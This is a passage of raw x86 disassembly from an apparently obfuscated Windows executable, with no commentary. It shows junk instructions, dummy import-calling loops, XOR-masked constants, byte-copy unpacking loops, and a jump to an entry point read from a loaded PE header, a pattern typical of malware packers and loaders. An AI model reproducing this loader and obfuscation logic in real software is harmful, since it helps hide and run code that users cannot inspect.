  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237ad
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a66
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a62,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421952
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237a9
  419500:	mov    esi,DWORD PTR ds:0x42178a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421952
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b6e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x4234de
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421952
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421782
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423604
  4196bb:	push   0x42357f
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b6e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421952
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237b9
  4197cd:	mov    eax,ds:0x42177e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x4235fa
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x423564
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42175e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421952
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42375e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x4217d6,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x421a2a,eax
  419ba6:	mov    eax,ds:0x4217d6
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421952
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x421a2a
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x4217d6
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421952
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421952
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421952
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x4219d6,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x4219ce,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421952
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
